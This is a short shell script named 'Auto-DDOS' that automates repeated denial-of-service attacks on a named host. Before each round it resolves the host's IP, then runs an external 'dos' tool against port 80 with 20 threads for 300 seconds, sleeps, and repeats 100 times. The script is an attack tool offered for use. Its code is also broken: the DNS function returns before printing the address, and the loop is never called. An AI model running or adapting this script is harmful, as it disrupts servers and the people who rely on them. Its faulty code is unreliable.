#!/bin/sh
# Auto-DDOS

# A shell script to manage ddos attacks in a loop, particularly useful when 
# a) you don't have the  seq command available, and 
# b) the target server has a round-robbin dns setup, or 
# c) your ddos program doesn't do name resolution.
# Do a dns lookup before each attack (requires dns script, or some binary
# that takes a hostname and returns an ip address). 
# Sleep for $__ seconds and do it again.

dns(){
ip=$(nslookup $host |sed -n 5p | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
if [[ "$ip" != "" ]] ; then return 0 ; else return 1 ; fi
echo "$ip"
}

loop(){
i=0
while [[ "$i" -lt "$hits" ]];do 
export target=$(dns $host)
dos -t $target 80 20 $intOn # dos <-t/-u> <ip> <port> <threads> <seconds>
sleep $intOff
i=`expr $i + 1`
done
}




host="$@"
hits=100
intOn=300
intOff=150
